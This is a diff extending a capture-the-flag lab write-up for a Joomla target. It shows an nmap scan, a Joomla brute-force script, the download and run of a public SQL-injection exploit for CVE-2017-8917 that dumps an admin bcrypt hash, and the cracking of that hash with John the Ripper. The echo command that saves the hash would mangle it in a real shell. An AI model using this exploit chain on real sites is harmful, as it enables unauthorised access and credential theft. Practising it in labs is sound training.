@@ -1,6 +1,37 @@
 # Daily Bugle
 Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.
 
+Its worth checking NMAP with anyweb site first to see what to expect
+```
+┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/DailyBugle]
+└─$ nmap -sV -sC 10.49.166.149 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-06 03:25 +1000
+Nmap scan report for 10.49.166.149
+Host is up (0.45s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+|_http-generator: Joomla! - Open Source Content Management
+3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.14 seconds
+```
+3 services of interest MySQL, SSH and CMS Joomla on Appache, possibly a CentOS Operating system.
+-O flag was included before but did not show anything conclusive with several lines of (no benefit):
+OS:SCAN(V=7.99%E=4%D=5/6%OT=22%CT=1%CU=31662%PV=Y%DS=3%DC=I%G=Y%TM=69FA26FD....
+
 # Task 1 Deploy
 ## Q1 view the IP in browser, who robbed the bank.
 Answer: spiderman
@@ -89,4 +120,48 @@ If joomla structure known a more direct path was:
 curl TargetIP/administrator/language/en-GB/en-GB.xml | grep "3.7"
 <version>3.7.0</version>
 
+
+
+
+
+nmap has a script for almost everything here I tried a joomla script:
+nmap --script http-joomla-brute -p80,443 TARGET
+
+
+
 Answer Q1: 3.7.0
+
+## Q2: What is Jonah's cracked password?
+Try hackme module states *Instead of using SQLMap, why not use a python script!*.
+This means we can rule out search sploitsploit exploit found in 42033.txt which is just a SQLMAP script. But it clearly states CVE-2017-8917 as the vulnerability as does a simple search in google for this version 3.7.0. A github respository at https://github.com/teranpeterson/Joomblah has a python script for this CVE. 
+
+Link to python script 
+wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
+
+```
+python joomblah.py <TargetIP>
+
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user [u'811', u'Super User', u'jonah', u'jonah@tryhackme.com', u'$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', u'', u'']
+  -  Extracting sessions from fb9j5_session
+```
+This gives us Super User: jonah and hash: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+```
+$ echo "$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm" > hash.txt
+
+$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+spiderman123     (?)     
+1g 0:00:27:38 DONE (2026-05-06 04:59) 0.000603g/s 28.24p/s 28.24c/s 28.24C/s spiderman123..speciala
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+Answer Q2: spiderman123 
+
+
